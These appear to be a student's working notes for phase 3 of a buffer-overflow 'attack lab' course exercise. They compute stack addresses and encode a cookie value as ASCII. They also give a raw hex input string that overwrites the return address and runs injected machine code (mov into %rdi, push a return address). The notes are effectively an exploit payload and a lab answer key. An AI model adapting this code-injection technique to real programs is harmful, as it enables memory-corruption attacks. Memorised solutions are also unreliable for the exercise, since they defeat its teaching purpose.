lets place our string in
0x55640088 + 0x80 = 0x55640108

lets place our injected code in
0x55640088 + 0x90 = 0x55640118

            3661a994
cookie is 0x3661a994
so bytes are
33 36 36 31 61 39 39 34

source code for phase3 is
mov $0x55640108, %rdi
movq $0x401997, (%rsp)

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
18 01 64 55 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
33 36 36 31 61 39 39 34
00 00 00 00 00 00 00 00
48 c7 c7 08 01 64 55 48
c7 04 24 97 19 40 00 c3

this line starts at 0x90 from 0x55640088
